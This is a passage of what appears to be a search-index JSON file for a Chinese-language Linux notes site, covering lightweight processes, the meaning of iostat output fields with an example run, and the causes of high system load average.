\u56e0\u4e3aLWP\u4e4b\u95f4\u5171\u4eab\u5b83\u4eec\u7684\u5927\u90e8\u5206\u8d44\u6e90\uff0c\u6240\u4ee5\u5b83\u5728\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5c31\u4e0d\u9002\u7528\u4e86\uff1b\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u4f7f\u7528\u591a\u4e2a\u666e\u901a\u7684\u8fdb\u7a0b\u4e86\u3002\u4f8b\u5982\uff0c\u4e3a\u4e86\u907f\u514d\u5185\u5b58\u6cc4\u6f0f\uff08a process can be replaced by another one\uff09\u548c\u5b9e\u73b0\u7279\u6743\u5206\u9694\uff08processes can run under other credentials and have other permissions\uff09\u3002 \u6211\u4eec\u53ef\u4ee5\u628aLWP\u770b\u6210\u662f\u4e00\u4e2a\u7ebf\u7a0b\u3002\u5c31\u56e0\u4e3a\u8fd9\u4e2a\u4f7f\u5f97\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u6982\u5ff5\u6df7\u6dc6\u4e86\uff0c\u6709\u4eba\u8bf4\u7cfb\u7edf\u8c03\u5ea6\u5355\u4f4d\u662f\u8fdb\u7a0b\uff0c\u53c8\u6709\u4eba\u8bf4\u662f\u7ebf\u7a0b\uff0c\u5176\u5b9e\u7cfb\u7edf\u8c03\u5ea6\u7684\u5355\u4f4d\u4e00\u76f4\u5c31\u6ca1\u6709\u6539\u53d8\uff0c\u53ea\u662f\u540e\u6765\u90e8\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u754c\u9650\u6a21\u7cca\u4e86 \u53c2\u8003\u6587\u6863\uff1a http://www.uml.org.cn/embeded/202011244.asp https://www.daimajiaoliu.com/daima/485a207729003f8 https://www.daimajiaoliu.com/daima/4795933fc9003ec https://www.modb.pro/db/15191","title":"LWP"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/iostat/","text":"iostat\u547d\u4ee4 \u5e38\u89c1\u6807\u9898\u663e\u793a $ iostat -xt 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/29/2022 _x86_64_ (4 CPU) 05/29/2022 09:23:14 PM avg-cpu: %user %nice %system %iowait %steal %idle 0.09 0.00 0.12 0.01 0.00 99.79 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.22 0.02 0.65 0.95 4.77 17.04 0.00 2.24 3.84 2.19 0.57 0.04 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.49 0.49 0.00 0.33 0.00 scd0 0.00 0.00 0.00 0.00 0.00 0.00 7.23 0.00 0.18 0.18 0.00 0.18 0.00 \"iostat\u547d\u4ee4\u8be6\u60c5\" \"%user\uff1aCPU\u5904\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%nice\uff1aCPU\u5904\u5728\u5e26NICE\u503c\u7684\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%system\uff1aCPU\u5904\u5728\u7cfb\u7edf\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\u6b63\u5e38\u5c0f\u4e8e15%\" \"%iowait\uff1aCPU\u7b49\u5f85\u8f93\u5165\u8f93\u51fa\u5b8c\u6210\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\" \"%steal\uff1a\u7ba1\u7406\u7a0b\u5e8f\u7ef4\u62a4\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u65f6\uff0c\u865a\u62dfCPU\u7684\u65e0\u610f\u8bc6\u7b49\u5f85\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%idle\uff1aCPU\u7a7a\u95f2\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"rrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u8bfb\u53d6\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\uff08\u5f53\u7cfb\u7edf\u8c03\u7528\u9700\u8981\u8bfb\u53d6\u6570\u636e\u7684\u65f6\u5019\uff0cVFS\u5c06\u8bf7\u6c42\u53d1\u5230\u5404\u4e2aFS\uff0c\u5982\u679cFS\u53d1\u73b0\u4e0d\u540c\u7684\u8bfb\u53d6\u8bf7\u6c42\u8bfb\u53d6\u7684\u662f\u76f8\u540cBlock\u7684\u6570\u636e\uff0cFS\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u5408\u5e76Merge\uff09\" \"wrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u5199\u5165\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\" \"rsec/s\uff1a\u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u6570\" \"wsec/\uff1a\u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u6570\" \"r/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u8bfb\u6b21\u6570\" \"w/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u5199\u6b21\u6570\" \"avgrq-sz\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f (\u6247\u533a)\u3002delta(rsect+wsect)/delta(rio+wio)\" \"avgqu-sz\uff1a\u5e73\u5747I/O\u961f\u5217\u957f\u5ea6\u3002\u5373 delta(aveq)/s/1000 (\u56e0\u4e3aaveq\u7684\u5355\u4f4d\u4e3a\u6beb\u79d2)\u3002\" \u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u4e5f\u53ef\u4f5c\u4e3a\u8861\u91cf\u7cfb\u7edf I/O \u8d1f\u8377\u7684\u6307\u6807\uff0c\u4f46\u7531\u4e8e avgqu-sz \u662f\u6309\u7167\u5355\u4f4d\u65f6\u95f4\u7684\u5e73\u5747\u503c\uff0c\u6240\u4ee5\u4e0d\u80fd\u53cd\u6620\u77ac\u95f4\u7684 I/O \u6d2a\u6c34\u3002 \"await\uff1a \u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u7b49\u5f85\u65f6\u95f4 (\u6beb\u79d2)\u3002\u5373 delta(ruse+wuse)/delta(rio+wio)\" \u5e73\u65f6\u5c31\u770bawait\u503c\u5927\u5c0f\uff0c\u51e0\u5343\u6216\u8005\u51e0\u4e07\u78c1\u76d8\u5c31\u662f\u6709\u95ee\u9898 \"r_await\uff1a\u6bcf\u4e2a\u8bfb\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u8bfb\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"w_await\uff1a\u6bcf\u4e2a\u5199\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u5199\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"svctm\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u670d\u52a1\u65f6\u95f4 (\u6beb\u79d2) \"%util\uff1a \u5728\u7edf\u8ba1\u65f6\u95f4\u5185\u6240\u6709\u5904\u7406IO\u65f6\u95f4\uff0c\u9664\u4ee5\u603b\u5171\u7edf\u8ba1\u65f6\u95f4\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7edf\u8ba1\u95f4\u96941\u79d2\uff0c\u8be5\u8bbe\u5907\u67090.8\u79d2\u5728\u5904\u7406IO\uff0c\u800c0.2\u79d2\u95f2\u7f6e\uff0c\u90a3\u4e48\u8be5\u8bbe\u5907\u7684%util = 0.8/1 = 80%\uff0c\u6240\u4ee5\u8be5\u53c2\u6570\u6697\u793a\u4e86\u8bbe\u5907\u7684\u7e41\u5fd9\u7a0b\u5ea6\" \u522b\u4eba\u4e00\u4e2a\u4e0d\u9519\u7684\u4f8b\u5b50.(I/O \u7cfb\u7edf vs. \u8d85\u5e02\u6392\u961f) \u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8d85\u5e02\u6392\u961f checkout \u65f6\uff0c\u600e\u4e48\u51b3\u5b9a\u8be5\u53bb\u54ea\u4e2a\u4ea4\u6b3e\u53f0\u5462? \u9996\u5f53\u662f\u770b\u6392\u7684\u961f\u4eba\u6570\uff0c5\u4e2a\u4eba\u603b\u6bd420\u4eba\u8981\u5feb\u5427? \u9664\u4e86\u6570\u4eba\u5934\uff0c\u6211\u4eec\u4e5f\u5e38\u5e38\u770b\u770b\u524d\u9762\u4eba\u8d2d\u4e70\u7684\u4e1c\u897f\u591a\u5c11\uff0c\u5982\u679c\u524d\u9762\u6709\u4e2a\u91c7\u8d2d\u4e86\u4e00\u661f\u671f\u98df\u54c1\u7684\u5927\u5988\uff0c\u90a3\u4e48\u53ef\u4ee5\u8003\u8651\u6362\u4e2a\u961f\u6392\u4e86\u3002\u8fd8\u6709\u5c31\u662f\u6536\u94f6\u5458\u7684\u901f\u5ea6\u4e86\uff0c\u5982\u679c\u78b0\u4e0a\u4e86\u8fde \u94b1\u90fd\u70b9\u4e0d\u6e05\u695a\u7684\u65b0\u624b\uff0c\u90a3\u5c31\u6709\u7684\u7b49\u4e86\u3002\u53e6\u5916\uff0c\u65f6\u673a\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u80fd 5 \u5206\u949f\u524d\u8fd8\u4eba\u6ee1\u4e3a\u60a3\u7684\u6536\u6b3e\u53f0\uff0c\u73b0\u5728\u5df2\u662f\u4eba\u53bb\u697c\u7a7a\uff0c\u8fd9\u65f6\u5019\u4ea4\u6b3e\u53ef\u662f\u5f88\u723d\u554a\uff0c\u5f53\u7136\uff0c\u524d\u63d0\u662f\u90a3\u8fc7\u53bb\u7684 5 \u5206\u949f\u91cc\u6240\u505a\u7684\u4e8b\u60c5\u6bd4\u6392\u961f\u8981\u6709\u610f\u4e49 (\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e8b\u60c5\u6bd4\u6392\u961f\u8fd8\u65e0\u804a\u7684)\u3002 I/O \u7cfb\u7edf\u4e5f\u548c\u8d85\u5e02\u6392\u961f\u6709\u5f88\u591a\u7c7b\u4f3c\u4e4b\u5904: r/s+w/s \u7c7b\u4f3c\u4e8e\u4ea4\u6b3e\u4eba\u7684\u603b\u6570 \u5e73\u5747\u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u7c7b\u4f3c\u4e8e\u5355\u4f4d\u65f6\u95f4\u91cc\u5e73\u5747\u6392\u961f\u4eba\u7684\u4e2a\u6570 \u5e73\u5747\u670d\u52a1\u65f6\u95f4\uff08svctm\uff09\u7c7b\u4f3c\u4e8e\u6536\u94f6\u5458\u7684\u6536\u6b3e\u901f\u5ea6 \u5e73\u5747\u7b49\u5f85\u65f6\u95f4\uff08await\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u7684\u7b49\u5f85\u65f6\u95f4 \u5e73\u5747I/O\u6570\u636e\uff08avgrq-sz\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u6240\u4e70\u7684\u4e1c\u897f\u591a\u5c11 I/O \u64cd\u4f5c\u7387\uff08%util\uff09\u7c7b\u4f3c\u4e8e\u6536\u6b3e\u53f0\u524d\u6709\u4eba\u6392\u961f\u7684\u65f6\u95f4\u6bd4\u4f8b\u3002 \u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u6570\u636e\u5206\u6790\u51fa I/O \u8bf7\u6c42\u7684\u6a21\u5f0f\uff0c\u4ee5\u53ca I/O \u7684\u901f\u5ea6\u548c\u54cd\u5e94\u65f6\u95f4\u3002 iostat(1) - Linux manual page (man7.org) http://www.360doc.com/content/14/0410/18/13876790_367816565.shtml","title":"iostat\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/iostat/#iostat","text":"","title":"iostat\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/iostat/#_1","text":"$ iostat -xt 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/29/2022 _x86_64_ (4 CPU) 05/29/2022 09:23:14 PM avg-cpu: %user %nice %system %iowait %steal %idle 0.09 0.00 0.12 0.01 0.00 99.79 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.22 0.02 0.65 0.95 4.77 17.04 0.00 2.24 3.84 2.19 0.57 0.04 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.49 0.49 0.00 0.33 0.00 scd0 0.00 0.00 0.00 0.00 0.00 0.00 7.23 0.00 0.18 0.18 0.00 0.18 0.00 \"iostat\u547d\u4ee4\u8be6\u60c5\" \"%user\uff1aCPU\u5904\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%nice\uff1aCPU\u5904\u5728\u5e26NICE\u503c\u7684\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%system\uff1aCPU\u5904\u5728\u7cfb\u7edf\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\u6b63\u5e38\u5c0f\u4e8e15%\" \"%iowait\uff1aCPU\u7b49\u5f85\u8f93\u5165\u8f93\u51fa\u5b8c\u6210\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\" \"%steal\uff1a\u7ba1\u7406\u7a0b\u5e8f\u7ef4\u62a4\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u65f6\uff0c\u865a\u62dfCPU\u7684\u65e0\u610f\u8bc6\u7b49\u5f85\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%idle\uff1aCPU\u7a7a\u95f2\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"rrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u8bfb\u53d6\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\uff08\u5f53\u7cfb\u7edf\u8c03\u7528\u9700\u8981\u8bfb\u53d6\u6570\u636e\u7684\u65f6\u5019\uff0cVFS\u5c06\u8bf7\u6c42\u53d1\u5230\u5404\u4e2aFS\uff0c\u5982\u679cFS\u53d1\u73b0\u4e0d\u540c\u7684\u8bfb\u53d6\u8bf7\u6c42\u8bfb\u53d6\u7684\u662f\u76f8\u540cBlock\u7684\u6570\u636e\uff0cFS\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u5408\u5e76Merge\uff09\" \"wrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u5199\u5165\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\" \"rsec/s\uff1a\u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u6570\" \"wsec/\uff1a\u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u6570\" \"r/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u8bfb\u6b21\u6570\" \"w/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u5199\u6b21\u6570\" \"avgrq-sz\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f (\u6247\u533a)\u3002delta(rsect+wsect)/delta(rio+wio)\" \"avgqu-sz\uff1a\u5e73\u5747I/O\u961f\u5217\u957f\u5ea6\u3002\u5373 delta(aveq)/s/1000 (\u56e0\u4e3aaveq\u7684\u5355\u4f4d\u4e3a\u6beb\u79d2)\u3002\" \u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u4e5f\u53ef\u4f5c\u4e3a\u8861\u91cf\u7cfb\u7edf I/O \u8d1f\u8377\u7684\u6307\u6807\uff0c\u4f46\u7531\u4e8e avgqu-sz \u662f\u6309\u7167\u5355\u4f4d\u65f6\u95f4\u7684\u5e73\u5747\u503c\uff0c\u6240\u4ee5\u4e0d\u80fd\u53cd\u6620\u77ac\u95f4\u7684 I/O \u6d2a\u6c34\u3002 \"await\uff1a \u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u7b49\u5f85\u65f6\u95f4 (\u6beb\u79d2)\u3002\u5373 delta(ruse+wuse)/delta(rio+wio)\" \u5e73\u65f6\u5c31\u770bawait\u503c\u5927\u5c0f\uff0c\u51e0\u5343\u6216\u8005\u51e0\u4e07\u78c1\u76d8\u5c31\u662f\u6709\u95ee\u9898 \"r_await\uff1a\u6bcf\u4e2a\u8bfb\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u8bfb\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"w_await\uff1a\u6bcf\u4e2a\u5199\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u5199\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"svctm\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u670d\u52a1\u65f6\u95f4 (\u6beb\u79d2) \"%util\uff1a \u5728\u7edf\u8ba1\u65f6\u95f4\u5185\u6240\u6709\u5904\u7406IO\u65f6\u95f4\uff0c\u9664\u4ee5\u603b\u5171\u7edf\u8ba1\u65f6\u95f4\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7edf\u8ba1\u95f4\u96941\u79d2\uff0c\u8be5\u8bbe\u5907\u67090.8\u79d2\u5728\u5904\u7406IO\uff0c\u800c0.2\u79d2\u95f2\u7f6e\uff0c\u90a3\u4e48\u8be5\u8bbe\u5907\u7684%util = 0.8/1 = 80%\uff0c\u6240\u4ee5\u8be5\u53c2\u6570\u6697\u793a\u4e86\u8bbe\u5907\u7684\u7e41\u5fd9\u7a0b\u5ea6\" \u522b\u4eba\u4e00\u4e2a\u4e0d\u9519\u7684\u4f8b\u5b50.(I/O \u7cfb\u7edf vs. \u8d85\u5e02\u6392\u961f) \u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8d85\u5e02\u6392\u961f checkout \u65f6\uff0c\u600e\u4e48\u51b3\u5b9a\u8be5\u53bb\u54ea\u4e2a\u4ea4\u6b3e\u53f0\u5462? \u9996\u5f53\u662f\u770b\u6392\u7684\u961f\u4eba\u6570\uff0c5\u4e2a\u4eba\u603b\u6bd420\u4eba\u8981\u5feb\u5427? \u9664\u4e86\u6570\u4eba\u5934\uff0c\u6211\u4eec\u4e5f\u5e38\u5e38\u770b\u770b\u524d\u9762\u4eba\u8d2d\u4e70\u7684\u4e1c\u897f\u591a\u5c11\uff0c\u5982\u679c\u524d\u9762\u6709\u4e2a\u91c7\u8d2d\u4e86\u4e00\u661f\u671f\u98df\u54c1\u7684\u5927\u5988\uff0c\u90a3\u4e48\u53ef\u4ee5\u8003\u8651\u6362\u4e2a\u961f\u6392\u4e86\u3002\u8fd8\u6709\u5c31\u662f\u6536\u94f6\u5458\u7684\u901f\u5ea6\u4e86\uff0c\u5982\u679c\u78b0\u4e0a\u4e86\u8fde \u94b1\u90fd\u70b9\u4e0d\u6e05\u695a\u7684\u65b0\u624b\uff0c\u90a3\u5c31\u6709\u7684\u7b49\u4e86\u3002\u53e6\u5916\uff0c\u65f6\u673a\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u80fd 5 \u5206\u949f\u524d\u8fd8\u4eba\u6ee1\u4e3a\u60a3\u7684\u6536\u6b3e\u53f0\uff0c\u73b0\u5728\u5df2\u662f\u4eba\u53bb\u697c\u7a7a\uff0c\u8fd9\u65f6\u5019\u4ea4\u6b3e\u53ef\u662f\u5f88\u723d\u554a\uff0c\u5f53\u7136\uff0c\u524d\u63d0\u662f\u90a3\u8fc7\u53bb\u7684 5 \u5206\u949f\u91cc\u6240\u505a\u7684\u4e8b\u60c5\u6bd4\u6392\u961f\u8981\u6709\u610f\u4e49 (\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e8b\u60c5\u6bd4\u6392\u961f\u8fd8\u65e0\u804a\u7684)\u3002 I/O \u7cfb\u7edf\u4e5f\u548c\u8d85\u5e02\u6392\u961f\u6709\u5f88\u591a\u7c7b\u4f3c\u4e4b\u5904: r/s+w/s \u7c7b\u4f3c\u4e8e\u4ea4\u6b3e\u4eba\u7684\u603b\u6570 \u5e73\u5747\u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u7c7b\u4f3c\u4e8e\u5355\u4f4d\u65f6\u95f4\u91cc\u5e73\u5747\u6392\u961f\u4eba\u7684\u4e2a\u6570 \u5e73\u5747\u670d\u52a1\u65f6\u95f4\uff08svctm\uff09\u7c7b\u4f3c\u4e8e\u6536\u94f6\u5458\u7684\u6536\u6b3e\u901f\u5ea6 \u5e73\u5747\u7b49\u5f85\u65f6\u95f4\uff08await\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u7684\u7b49\u5f85\u65f6\u95f4 \u5e73\u5747I/O\u6570\u636e\uff08avgrq-sz\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u6240\u4e70\u7684\u4e1c\u897f\u591a\u5c11 I/O \u64cd\u4f5c\u7387\uff08%util\uff09\u7c7b\u4f3c\u4e8e\u6536\u6b3e\u53f0\u524d\u6709\u4eba\u6392\u961f\u7684\u65f6\u95f4\u6bd4\u4f8b\u3002 \u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u6570\u636e\u5206\u6790\u51fa I/O \u8bf7\u6c42\u7684\u6a21\u5f0f\uff0c\u4ee5\u53ca I/O \u7684\u901f\u5ea6\u548c\u54cd\u5e94\u65f6\u95f4\u3002 iostat(1) - Linux manual page (man7.org) http://www.360doc.com/content/14/0410/18/13876790_367816565.shtml","title":"\u5e38\u89c1\u6807\u9898\u663e\u793a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/","text":"load\u9ad8\u7684\u539f\u56e0 \u524d\u8a00 \u5176\u5b9eLinux\u662f\u4e0d\u533a\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\uff0c\u5728Linux\u773c\u91cc\u90fd\u662f\u8fdb\u7a0b\uff0cLinux\u4e3a\u4e86\u5b8c\u6210\u5bf9\u7ebf\u7a0b\u7684POSIX\u6807\u51c6\uff0c\u5f15\u5165\u4e86LWP\uff0c\u5c31\u662f\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u5373\u6211\u4eec\u773c\u4e2d\u7684\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u521b\u5efa\u65b9\u6cd5\u5728\u5e95\u5c42\u662f\u76f8\u540c\u7684\uff0c\u90fd\u662f\u8c03\u7528do_fork()\u65b9\u6cd5\uff0c\u53ea\u662f\u4f20\u53c2\u4e0d\u540c\u3002\u5c31\u56e0\u4e3a\u8fd9\u4e2a\u4f7f\u5f97\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u6982\u5ff5\u6df7\u6dc6\u4e86\uff0c\u6709\u4eba\u8bf4\u7cfb\u7edf\u8c03\u5ea6\u5355\u4f4d\u662f\u8fdb\u7a0b\uff0c\u53c8\u6709\u4eba\u8bf4\u662f\u7ebf\u7a0b\uff0c\u5176\u5b9e\u7cfb\u7edf\u8c03\u5ea6\u7684\u5355\u4f4d\u4e00\u76f4\u5c31\u6ca1\u6709\u6539\u53d8\uff0c\u53ea\u662f\u540e\u6765\u90e8\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u754c\u9650\u6a21\u7cca\u4e86 \u67e5\u770b\u7cfb\u7edf\u6240\u6709\u7684LWP\u548c\u666e\u901a\u8fdb\u7a0b\uff1a $ ps -ALFlf \u67e5\u770b\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u666e\u901a\u8fdb\u7a0b\uff1a $ ps -ef \u4e0b\u9762\u8bf4\u7684\u8fdb\u7a0b\u90fd\u662f\u8bf4\u666e\u901a\u8fdb\u7a0b+LWP \u7b80\u5355\u6765\u8bf4\uff0c\u5e73\u5747\u8d1f\u8f7d\u662f\u6307\u5355\u4f4d\u65f6\u95f4\u5185\uff0c\u7cfb\u7edf\u5904\u4e8e\u6b63\u5728\u8fd0\u884c\u3001\u53ef\u8fd0\u884c\u72b6\u6001\u548c\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7684\u5e73\u5747\u8fdb\u7a0b\uff08\u666e\u901a\u8fdb\u7a0b+LWP\uff09\u6570\uff0c\u5b83\u548c CPU \u4f7f\u7528\u7387\u5e76\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002 \u518d\u7b80\u5355\u53ef\u4ee5\u628aload\u770b\u6210 \uff08\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u6570+\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7684\u8fdb\u7a0b\u6570+\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u8fdb\u7a0b\u6570\uff09 \u6216\u8005\u628a load\u770b\u6210 \uff08R\u72b6\u6001\u7684\u8fdb\u7a0b+D\u72b6\u6001\u7684\u8fdb\u7a0b\uff09 \uff0c\u8fd9\u53ea\u662f\u7b80\u5355\u7684\u6765\u8bf4\uff0c\u5176\u5b9eload\u662f\u4e2a\u62df\u5408\u503c\uff0c\u5176\u4e2d\u6570\u5b66\u7b97\u6cd5\u6bd4\u8f83\u590d\u6742\uff0c\u5177\u4f53\u7684\u8ba1\u7b97\u65b9\u6cd5\u5728\u5982\u4e0b\u4ee3\u7801\u4e2d\u3002 load\u6570\u503c\u7684\u8ba1\u7b97\u4ee3\u7801\u4e3a\uff1ahttps://github.com/torvalds/linux/blob/master/fs/proc/loadavg.c \u67e5\u770b\u7cfb\u7edf\u7684load\u503c $ cat /proc/loadavg 0.06 0.04 0.05 1/170 4087 #\u524d\u4e09\u4e2a\u503c\u4e3a\u663e\u793a\u6700\u8fd11\u5206\u949f\uff0c5\u5206\u949f\uff0c15\u5206\u949f\u7684load\u503c #\u7b2c\u56db\u4e2a\u6570\u5b57\u4e3a\uff0c\u5206\u5b50\u4e3a\u5f53\u524d\u5904\u4e8eR\u72b6\u6001\u7ebf\u7a0b\u6570\u91cf\uff0c\u5206\u6bcd\u4e3a\u5f53\u524d\u7cfb\u7edf\u4e2d\u6709\u591a\u5c11\u4e2aLWP #\u7b2c\u4e94\u4e2a\u6570\u5b57\u4e3a\uff0c\u6700\u65b0\u521b\u5efa\u51fa\u6765\u7684PID\u4e3a\u591a\u5c11 \u4e00\u822cload\u6570\u5b57\u5728CPU\u7684\u903b\u8f91\u4e2a\u6570\u7684\u4e8c\u500d\u4ee5\u4e0b\u4e3a\u6b63\u5e38\u503c \u5904\u4e8e R \u72b6\u6001\uff08Running \u6216 Runnable\uff09\u7684\u8fdb\u7a0b\u662f\u6307 \u6b63\u5728\u8fd0\u884c \u6216\u8005 \u53ef\u8fd0\u884c\u5e76\u7b49\u5f85CPU\u6267\u884c \u7684\u8fdb\u7a0b\uff0c ps -ALFlf \u547d\u4ee4\u5728\u7b2c\u4e8c\u5217 S \u4e00\u5217\u4e2d\u663e\u793a R \u72b6\u6001\u7684\u8fdb\u7a0b \u5904\u4e8eD \u72b6\u6001\uff08Uninterruptible Sleep\uff0c\u4e5f\u79f0\u4e3a Disk Sleep\uff09\u7684\u8fdb\u7a0b\u662f\u6307 \u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001 \u7684\u8fdb\u7a0b\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u4e0d\u53ef\u6253\u65ad\u7684\u3002\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u662f\u7b49\u5f85\u786c\u4ef6\u8bbe\u5907\u7684 I/O \u54cd\u5e94\uff0c\u6216\u8005\u6267\u884c\u67d0\u4e9b\u5173\u952e\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6216\u8005\u8fdb\u5165\u9501\u72b6\u6001\uff0c\u90fd\u662f\u4f1a\u5904\u4e8eD\u72b6\u6001 \u4ece\u4e0a\u8ff0load\u7684\u8ba1\u7b97\u539f\u7406\u53ef\u4ee5\u770b\u51fa\uff0c\u5bfc\u81f4load 